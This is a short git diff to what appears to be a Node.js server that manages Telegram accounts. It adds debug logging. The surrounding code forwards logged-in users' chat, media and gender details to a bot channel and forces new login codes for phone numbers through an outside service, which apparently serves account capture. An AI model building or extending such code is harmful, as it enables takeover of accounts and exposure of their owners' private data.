@@ -280,6 +280,7 @@ app.post('/users', async (req, res, next) => {
   const cli = getClient(user.mobile);
   const activeClientSetup = getActiveClientSetup()
   if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
+    console.log(!cli, activeClientSetup?.phoneNumber, user.mobile)
     user['lastUpdated'] = new Date().toISOString().split('T')[0]
     await db.insertUser(user);
     await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
@@ -1739,7 +1740,7 @@ async function generateNewSession(phoneNumber) {
     await sleep(1000);
     const response = await fetchWithTimeout(`https://tgsignup.onrender.com/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);
     if (response) {
-      console.log(`Code Sent successfully-${response}`);
+      console.log(`Code Sent successfully-${JSON.stringify(response)}`);
       await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Code Sent successfully-${response}-${phoneNumber}`)}`);
     } else {
       await sleep(5000);
